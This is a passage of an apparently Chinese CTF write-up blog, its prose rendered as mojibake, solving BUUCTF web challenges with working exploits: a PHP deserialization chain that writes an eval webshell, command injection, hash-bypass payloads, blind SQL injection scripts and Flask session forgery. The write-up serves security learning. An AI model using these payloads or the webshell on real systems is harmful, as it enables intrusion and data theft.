ä¹‹åå°±å‰©phpexitäº†ï¼Œä½†æ˜¯å‘¢base64ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ªå­—èŠ‚ä¸€ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦åœ¨å‰é¢åŠ ä¸ªå­—ç¬¦</p></blockquote><p>åœ¨æœ¬é¢˜é‡Œå°±æ˜¯php//exitåŠ ä¸Šä¸­é—´æ ¼å¼åŒ–çš„12ä¸ªå­—ç¬¦å…±21ä¸ª</p><p>æˆ‘ä»¬å…ˆè®©</p><pre class="language-none"><code class="language-none">options[&#39;prefix&#39;] &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;&#39;</code></pre><p>è¿™æ ·å°±ä¼šä»¤å†™å…¥çš„å†…å®¹è¿›è¡Œbase64çš„è§£ç </p><p>ç„¶åè®©</p><pre class="language-none"><code class="language-none">complete &#x3D; &quot;xxxPD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+&quot;&#x2F;&#x2F;xxx&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;</code></pre><p>æœ¬åœ°å°è¯•ä¸€ä¸‹å¯ä»¥æˆåŠŸå†™å…¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220715002606265.png" alt="image-20220715002606265"></p><p>ç„¶åæ‰§è¡Œå‘½ä»¤å°±å¯ä»¥äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220715003158025.png" alt="image-20220715003158025"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220715003215168.png" alt="image-20220715003215168"></p><p>exp</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);class A &#123;    protected $store;    protected $key;    protected $expire;    public function __construct() &#123;        $this-&gt;key &#x3D; &#39;shell.php&#39;;        $this-&gt;store &#x3D; new B();;        $this-&gt;expire &#x3D; 0;        $this -&gt; autosave &#x3D; false;        $this -&gt; complete &#x3D; &#39;xxxPD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+&#39;;        $this -&gt; cache &#x3D; array();    &#125;&#125;class B &#123;    public $options &#x3D; array();    function __construct()    &#123;        $this-&gt;options[&#39;serialize&#39;] &#x3D; &#39;trim&#39;;        $this-&gt;options[&#39;prefix&#39;] &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;&#39;;        $this-&gt;options[&#39;data_compress&#39;] &#x3D; false;    &#125;&#125;echo urlencode(serialize(new A()));    &#x2F;&#x2F;O%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A3%3A%7Bs%3A9%3A%22serialize%22%3Bs%3A4%3A%22trim%22%3Bs%3A6%3A%22prefix%22%3Bs%3A50%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3D%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3Bi%3A0%3Bs%3A8%3A%22autosave%22%3Bb%3A0%3Bs%3A8%3A%22complete%22%3Bs%3A39%3A%22xxxPD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8%2B%22%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7D%7D</code></pre><p><strong>å¦ä¸€ç§è§£æ³•</strong></p><p>è®©</p><pre class="language-none"><code class="language-none">$b &#x3D; new B();$b-&gt;writeTimes &#x3D; 0;$b -&gt; options &#x3D; array(&#39;serialize&#39; &#x3D;&gt; &quot;system&quot;,    &#39;data_compress&#39; &#x3D;&gt; false,    &#39;prefix&#39; &#x3D;&gt; &quot;b&quot;);$a &#x3D; new A($store &#x3D; $b, $key &#x3D; &quot;.php&quot;, $expire &#x3D; 0);$a-&gt;autosave &#x3D; false;$a-&gt;cache &#x3D; array();$a-&gt;complete &#x3D; &#39;&#96;cat &#x2F;flag &gt; .&#x2F;flag.php&#96;&#39;echo urlencode(serialize($a));</code></pre><p>ç›¸å½“äº</p><p>æ‰§è¡Œ</p><pre class="language-php" data-language="php"><code class="language-php">system(&#39;[[],&quot;&#96;cat &#x2F;flag &gt; .&#x2F;flag.php&#96;&quot;]&#39;)</code></pre><p>åœ¨shellé‡Œæ‰§è¡Œçš„æ—¶å€™ åå¼•å· çš„ä¼˜å…ˆçº§æ˜¯é«˜äºå¼•å·çš„ï¼Œæ‰€ä»¥ä¼šå…ˆæ‰§è¡Œ<code>cat /flag &gt; ./flag.php</code>ï¼Œflagå°±è¢«å†™åˆ°flag.phpé‡Œé¢å»äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716114417633.png" alt="image-20220716114417633"></p><p><a href="https://www.sec-in.com/article/333">EIS 2019]EzPOPçš„å¤šç§è§£-SecIN (sec-in.com)</a></p><p>è¿™ä¸ªå¥½åƒæ˜¯æ ¹æ®thinkphp6.0çš„é“¾å­å‡ºçš„é¢˜</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716115312823.png" alt="image-20220716115312823"></p><p><a href="https://www.anquanke.com/post/id/194036">Thinkphp 6.0 æ–°çš„Gadget - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;        if( ($this-&gt;syc !&#x3D; $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) &#x3D;&#x3D;&#x3D; md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)&#x3D;&#x3D;&#x3D; sha1($this-&gt;lover)) )&#123;           if(!preg_match(&quot;&#x2F;\&lt;\?php|\(|\)|\&quot;|\&#39;&#x2F;&quot;, $this-&gt;syc, $match))&#123;               eval($this-&gt;syc);           &#125; else &#123;               die(&quot;Try Hard !!&quot;);           &#125;                   &#125;    &#125;&#125;if (isset($_GET[&#39;great&#39;]))&#123;    unserialize($_GET[&#39;great&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>å…¶å®çœ‹èµ·æ¥å¾ˆç®€å•ï¼Œåˆ©ç”¨æ•°ç»„ç»•è¿‡ifåˆ¤æ–­ç„¶åå¯ä»¥åˆ©ç”¨åå¼•å·ä»€ä¹ˆçš„æ‰§è¡Œå‘½ä»¤</p><p>ä½†æ˜¯å”¯ä¸€çš„é—®é¢˜åœ¨äºevalä¸èƒ½æ‰§è¡Œæ•°ç»„ä¸­çš„å‘½ä»¤</p><p>æ‰€ä»¥è¿™é‡Œè¦ç”¨Errorç±»å½“å½“ä½œå­—ç¬¦ä¸²çš„æ—¶å€™ä¼šè§¦å‘toStringå‡½æ•°å¯¼è‡´XSS</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716121942056.png" alt="image-20220716121942056"></p><blockquote><p>å¯ä»¥çœ‹åˆ°å½“ä½œå­—ç¬¦ä¸²æ—¶è¿”å›çš„å†…å®¹ä¼šä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å‡ºå½“å‰æŠ¥é”™ï¼ŒåŒ…å«å½“å‰çš„é”™è¯¯ä¿¡æ¯ï¼ˆpayloadï¼‰ä»¥åŠå½“å‰æŠ¥é”™çš„è¡Œå·ï¼ˆ2ï¼‰ï¼Œè€Œä¼ å…¥ Error(â€œpayloadâ€,1) ä¸­çš„é”™è¯¯ä»£ç â€œ1â€åˆ™æ²¡æœ‰è¾“å‡ºå‡ºæ¥ï¼Œä½†å…¶æœ¬èº«å…¶å®å¹¶ä¸ä¸€æ ·ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥ç»•è¿‡sha1å’Œmd5çš„æ¯”è¾ƒ</p></blockquote><p>æœ€åå°±æ˜¯æ„é€ æˆ‘ä»¬çš„payload</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716125507887.png" alt="image-20220716125507887"></p><p>è¿™é‡Œå› ä¸ºå¼•å·å’Œæ‹¬å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥é‡‡ç”¨å–åçš„æ–¹å¼ï¼Œè‡³äºæœ€åæ·»åŠ çš„?&gt;æ˜¯ä¸ºäº†ä½¿æ•´ä¸ªå‘½ä»¤é—­åˆ(?åº”è¯¥</p><p>å…¶å®æ›´ä¸¥è°¨ä¸€ç‚¹è¦ç”¨?&gt;&lt;?=include ?&gt;è¿™ç§</p><pre class="language-txt" data-language="txt"><code class="language-txt">äº‹å®ä¸Š$str &#x3D; &quot;?&gt;&lt;?&#x3D;include~&quot;.urldecode(&quot;%d0%99%93%9e%98&quot;).&quot;?&gt;&quot;;ä¹‹åï¼Œæˆ‘åœ¨æœ¬åœ°æŠŠ$this-&gt;sycè¾“å‡ºå‡ºæ¥çš„å†…å®¹å‰é¢ä¸€éƒ¨åˆ†æ˜¯Error: ?&gt;&lt;?&#x3D;include~Ğ™ï¿½ï¿½ï¿½; in +æŠ¥é”™è·¯å¾„è¿™ç§ï¼Œæˆ‘æœ¬æ¥è§‰å¾—?&gt;çš„æ•ˆæœæ˜¯æŠŠå‘½ä»¤å’Œæ²¡æœ‰ç”¨çš„æŠ¥é”™åˆ†å¼€ï¼Œä½†è¿™é‡Œå¦‚æœå»æ‰å‰é¢çš„?&gt;&lt;?&#x3D;è¿˜æ˜¯å¯ä»¥æ‹¿åˆ°flagï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆå»æ‰åé¢çš„?&gt;å°±ä¸è¡Œäº†å‘¢ï¼Œè€Œä¸”æŠŠåé¢çš„?&gt;ç”¨åˆ†å·ä»£æ›¿ä¹Ÿä¸è¡Œ,å¥½æ€ªå•Š</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716125448997.png" alt="image-20220716125448997"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716125651077.png" alt="image-20220716125651077"></p><h2 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2><p>å¥½çƒ¦sqlæ³¨å…¥</p><p>å…ˆæ˜¯é¢„å¤„ç†çš„å †å æ³¨å…¥</p><pre class="language-none"><code class="language-none">prepare stmt_name from preparable_stmt;execute stmt_name [using @var_name [, @var_name] ...];&#123;deallocate | drop&#125; prepare stmt_name;</code></pre><p>è¿˜æ˜¯ä¸ªæ—¶é—´ç›²æ³¨</p><p>è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ï¼Œå¯ä»¥ç”¨åå…­è¿›åˆ¶æ¥ç»•è¿‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/t01c4535f91421496d4.png" alt="img"></p><p>æŠ„ä¸ªè„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python">#author: c1e4rimport requestsimport jsonimport time def main():    #é¢˜ç›®åœ°å€    url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;ed59e513-784d-42b5-81d0-2c4dc976d086.node3.buuoj.cn&#x2F;index.php?r&#x3D;Login&#x2F;Index&#39;&#39;&#39;    #æ³¨å…¥payload    payloads &#x3D; &quot;admin&#39;;set @a&#x3D;0x&#123;0&#125;;prepare b from @a;execute b--+&quot;    flag &#x3D; &#39;&#39;    for i in range(1,30):        #æŸ¥è¯¢payload        payload &#x3D; &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))&#x3D;&#123;1&#125;,sleep(3),1)&quot;        for j in range(0,128):            #å°†æ„é€ å¥½çš„payloadè¿›è¡Œ16è¿›åˆ¶è½¬ç å’Œjsonè½¬ç             datas &#x3D; &#123;&#39;username&#39;:payloads.format(str_to_hex(payload.format(i,j))),&#39;password&#39;:&#39;test213&#39;&#125;            data &#x3D; json.dumps(datas)            times &#x3D; time.time()            res &#x3D; requests.post(url &#x3D; url, data &#x3D; data)            if time.time() - times &gt;&#x3D; 3:                flag &#x3D; flag + chr(j)                print(flag)                break def str_to_hex(s):    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s]) if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    main()</code></pre><p>æ‰«åˆ°æœ€åèƒ½å‘ç°æ˜¯glzjin_wants_a_girl_friend.zip</p><p>åº”è¯¥æ˜¯æºç æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥å®¡è®¡ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719124740608.png" alt="image-20220719124740608"></p><p>è¿™é‡Œå¦‚æœ$viewDateå¯æ§ï¼Œå°±èƒ½è¾¾åˆ°å˜é‡è¦†ç›–çš„ç›®çš„</p><p><strong><code>extract</code></strong> ä¼ å…¥ <strong><code>viewdata</code></strong> æ•°ç»„é€ æˆå˜é‡è¦†ç›–ï¼Œå‘ç°åˆ©ç”¨ <strong><code>loadView</code></strong> æ–¹æ³•çš„å¹¶ä¸”ç¬¬äºŒä¸ªå…ƒç´ å¯æ§çš„åœ°æ–¹åªæœ‰**<code>UserController.php</code>**</p><p>åœ¨UserController.phpä¸­</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719123840518.png" alt="image-20220719123840518"></p><p>$listDataæ˜¯ä»REQUESTæå–å‡ºæ¥çš„ï¼Œå®Œå…¨å¯æ§ã€‚</p><p>åœ¨ <code>userIndex.php</code> æ–‡ä»¶é‡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719124437218.png" alt="image-20220719124437218"></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å˜é‡è¦†ç›–img_fileè¿™ä¸ªå˜é‡è¾¾åˆ°æ–‡ä»¶åŒ…å«flagæ–‡ä»¶çš„ç›®çš„</p><p>åœ¨fun.phpæ˜¾ç¤ºäº†è·¯ç”±æ§åˆ¶çš„éƒ¨åˆ†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719125349740.png" alt="image-20220719125349740"></p><p>æ‰€ä»¥æœ€åçš„payloadå°±æ˜¯</p><p><code>r=User/Index&amp;img_file=/../flag.php</code></p><p>è¿™é‡Œçš„è·¯å¾„ä¸èƒ½ç›´æ¥../flag.phpæ˜¯å› ä¸º**dirname(__FILE__)**è¿”å›çš„è·¯å¾„æ˜¯ç±»ä¼¼C:/root/www/b.phpè¿™ç§ï¼Œæ‰€ä»¥è¦ç”¨/../flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719130208217.png" alt="image-20220719130208217"></p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web4"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web4" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web4"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web4</h2><p>ä¸€ä¸ªé•¿ç€ssrfå£³çš„Flask  sessionä¼ªé€ </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152339337.png" alt="image-20220719152339337"></p><p>å¯ä»¥çœ‹åˆ°åœ¨/flagè·¯ç”±ä¸‹éœ€è¦å¯¹sessionè¿›è¡Œä¸€ä¸ªæ£€æŸ¥ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹å½“å‰çš„session</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152324051.png" alt="image-20220719152324051"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152525813.png" alt="image-20220719152525813"></p><p>é‡Œé¢çš„base64è§£ç å†…å®¹æ˜¯www-data</p><p>æˆ‘ä»¬éœ€è¦æ„é€ æˆfuck</p><p>ä½†æ˜¯flaskçš„sessionæ„é€ éœ€è¦ä¸€ä¸ªå¯†é’¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152730546.png" alt="image-20220719152730546"></p><p>é¢˜ç›®é‡Œçš„å¯†é’¥æ˜¯éšæœºçš„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152757332.png" alt="image-20220719152757332"></p><p>ä½†åªè¦æœ‰ç§å­ï¼Œå°±èƒ½å¾—åˆ°ä¼ªéšæœºæ•°çš„å†…å®¹</p><p>è¿™é‡Œçš„seedä½¿ç”¨çš„uuid.getnode()çš„å€¼</p><p>è¿™æ˜¯æ˜¯ç½‘å¡macåœ°å€çš„åè¿›åˆ¶æ•°ï¼Œå‚¨å­˜è·¯å¾„ä¸º</p><p>/sys/class/net/ï¼ˆå¯¹åº”ç½‘å¡ï¼‰/address</p><p>//ä¸€èˆ¬éƒ½æ˜¯eth0</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719153332165.png" alt="image-20220719153332165"></p><p>å¾—åˆ°æ•°å€¼ä¸º</p><p>187154010911467</p><p>ç„¶åè·‘éšæœºæ•°</p><pre class="language-python" data-language="python"><code class="language-python">import randomrandom.seed(187154010911467)print(str(random.random()*233))</code></pre><p>è¿™é‡Œæœ‰ä¸ªå‘</p><p>é¢˜ç›®ç¯å¢ƒæ˜¯python2ï¼Œç„¶åä¼šç»™éšæœºæ•°çš„åå‡ ä½å››èˆäº”å…¥ï¼Œæ‰€ä»¥å¦‚æœç”¨python3è·‘æ‹¿ä¸åˆ°æ­£ç¡®çš„key</p><p>python2 ï¼š 147.299990175</p><p>python3 ï¼š147.299990174972</p><p>ç„¶åå°±æ˜¯ç”¨flask-session-cookie-manager-master.pyæ¥ä¼ªé€ session</p><p>å…ˆæ‹¿åˆ°åŸæœ¬çš„æ ¼å¼</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719164437961.png" alt="image-20220719164437961"></p><p>ç„¶åä¿®æ”¹å†…å®¹ååŠ å¯†</p><p>(è¿™é‡Œæœ‰å‡ ä¸ªcsdnçš„wpä¸Šçš„keyå¸¦äº†å¼•å·ï¼Œä½†æ˜¯æˆ‘è¯•çš„æ—¶å€™å‘ç°å¸¦äº†å¼•å·æ‹¿åˆ°çš„å€¼æ²¡æ³•è®¿é—®flag)</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719164413939.png" alt="image-20220719164413939"></p><p>æ”¹ä¸€ä¸‹sessionç„¶åè®¿é—®/flagè·¯ç”±å°±è¡Œäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719165101903.png" alt="image-20220719165101903"></p><h2 id="Black-Watch-å…¥ç¾¤é¢˜-Web"><a href="#Black-Watch-å…¥ç¾¤é¢˜-Web" class="headerlink" title="[Black Watch å…¥ç¾¤é¢˜]Web"></a>[Black Watch å…¥ç¾¤é¢˜]Web</h2><p>åˆæ˜¯ä¸ªsqlçš„ç›²æ³¨ã€‚ã€‚ã€‚</p><p>æ³¨å…¥ç‚¹åœ¨çƒ­ç‚¹çš„idä¸Š</p><p>ç›´æ¥ä¸Šè„šæœ¬äº†</p><pre class="language-python" data-language="python"><code class="language-python">from time import sleepimport requestsflag &#x3D; &#39;&#39;url &#x3D; &#39;http:&#x2F;&#x2F;5e09d480-4e60-4c83-86e7-50a897fd3c8f.node4.buuoj.cn:81&#x2F;backend&#x2F;content_detail.php?id&#x3D;1&#39;payload &#x3D; &#39;^(ord(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39;   #newspayload1 &#x3D; &#39;^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;\&#39;news\&#39;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39;  #admin,contentpayload2 &#x3D; &#39;^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;\&#39;admin\&#39;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39;#adminè¡¨é‡Œæœ‰id,username,password,is_enable  contentsè¡¨é‡Œæœ‰id,title,content,is_enablepayload3 &#x3D; &#39;^(ord(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39;#username 9e014c86,7385d505    password a40b205c,8d44ad75for i in range(1,1000):    high &#x3D; 137    low &#x3D; 28    mid &#x3D; (high + low) &#x2F;&#x2F; 2    while(low &lt; high):        urls &#x3D; url + payload3.format(i,mid)        response &#x3D; requests.get(urls)        print(low,response.text,mid,high)        if &#39;content&#39;  in response.text:            low &#x3D; mid + 1        else:            high &#x3D; mid        mid &#x3D; (high + low) &#x2F;&#x2F; 2        #print(mid)        sleep(0.2)    if chr(mid) &#x3D;&#x3D; &#39;&#39;:        break    else:        flag +&#x3D; chr(mid)    print(flag)</code></pre><p>è¾“å…¥ç¬¬äºŒç»„ç”¨æˆ·åå¯†ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719201159850.png" alt="image-20220719201159850"></p><h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$MY &#x3D; create_function(&quot;&quot;,&quot;die(&#96;cat flag.php&#96;);&quot;);$hash &#x3D; bin2hex(openssl_random_pseudo_bytes(32));eval(&quot;function SUCTF_$hash()&#123;&quot;    .&quot;global \$MY;&quot;    .&quot;\$MY();&quot;    .&quot;&#125;&quot;);if(isset($_GET[&#39;func_name&#39;]))&#123;    $_GET[&quot;func_name&quot;]();    die();&#125;show_source(__FILE__);</code></pre><p>æœ¬æ¥ä»¥ä¸ºæ˜¯openssl_random_pseudo_bytesè¿™ä¸ªå‡½æ•°æœ‰ç±»ä¼¼ä¼ªéšæœºæ•°çš„æ¼æ´ï¼Œçœ‹äº†ä¸‹wpå‘ç°æ˜¯create_functionçš„é—®é¢˜</p><p>create_function()å‡½æ•°åœ¨createä¹‹åä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå‡½æ•°åä¸º%00lambda_[0-999]ï¼Œåé¢çš„æ•°å­—ä¼šé€æ­¥é€’å¢</p><p>å‰å‡ ä¸ªè¯•ä¸å‡ºæ¥å°±è·‘ä¸€éå°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719214748226.png" alt="image-20220719214748226"></p><h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>å¼€å±€ä¸€ä¸ªé•¿å¾—åƒsqlæ³¨å…¥çš„ç™»é™†é¡µé¢ï¼Œå®é™…ä¸Šæ˜¯å¼±å¯†ç ã€‚ã€‚ã€‚admin/password</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719220511699.png" alt="image-20220719220511699"></p><p>ä¸Šä¼ ä¸ªæ–‡ä»¶ç›´æ¥é‡å‘½åæˆtxtäº†ã€‚ã€‚ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719220406784.png" alt="image-20220719220406784"></p><p>ç„¶åè¿™é‡Œçš„fileå‚æ•°ï¼Œè¯•ç€ç”¨ä¼ªåè®®è¯»æºç </p><p>upload.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719221052065.png" alt="image-20220719221052065"></p><pre class="language-php" data-language="php"><code class="language-php">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;ä¸Šä¼ æ–‡ä»¶&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;ä¸Šä¼ &quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;?phperror_reporting(0);class Uploader&#123;public $Filename;public $cmd;public $token;function __construct()&#123;$sandbox &#x3D; getcwd().&quot;&#x2F;uploads&#x2F;&quot;.md5($_SESSION[&#39;user&#39;]).&quot;&#x2F;&quot;;$ext &#x3D; &quot;.txt&quot;;@mkdir($sandbox, 0777, true);if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;&#x2F;data:\&#x2F;\&#x2F; | filter:\&#x2F;\&#x2F; | php:\&#x2F;\&#x2F; | \.&#x2F;i&quot;, $_GET[&#39;name&#39;]))&#123;$this-&gt;Filename &#x3D; $_GET[&#39;name&#39;];&#125;else&#123;$this-&gt;Filename &#x3D; $sandbox.$_SESSION[&#39;user&#39;].$ext;&#125;$this-&gt;cmd &#x3D; &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;$this-&gt;token &#x3D; $_SESSION[&#39;user&#39;];&#125;function upload($file)&#123;global $sandbox;global $ext;if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;$this-&gt;cmd &#x3D; &quot;die(&#39;illegal filename!&#39;);&quot;;&#125;else&#123;if($file[&#39;size&#39;] &gt; 1024)&#123;$this-&gt;cmd &#x3D; &quot;die(&#39;you are too big (â€²â–½&#96;ã€ƒ)&#39;);&quot;;&#125;else&#123;$this-&gt;cmd &#x3D; &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;&#125;&#125;&#125;function __toString()&#123;global $sandbox;global $ext;&#x2F;&#x2F; return $sandbox.$this-&gt;Filename.$ext;return $this-&gt;Filename;&#125;function __destruct()&#123;if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;$this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;&#125;eval($this-&gt;cmd);&#125;&#125;if(isset($_FILES[&#39;file&#39;])) &#123;$uploader &#x3D; new Uploader();$uploader-&gt;upload($_FILES[&quot;file&quot;]);if(@file_get_contents($uploader))&#123;echo &quot;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;echo file_get_contents($uploader);&#125;&#125;?&gt;</code></pre><p>home.php</p><pre class="language-php" 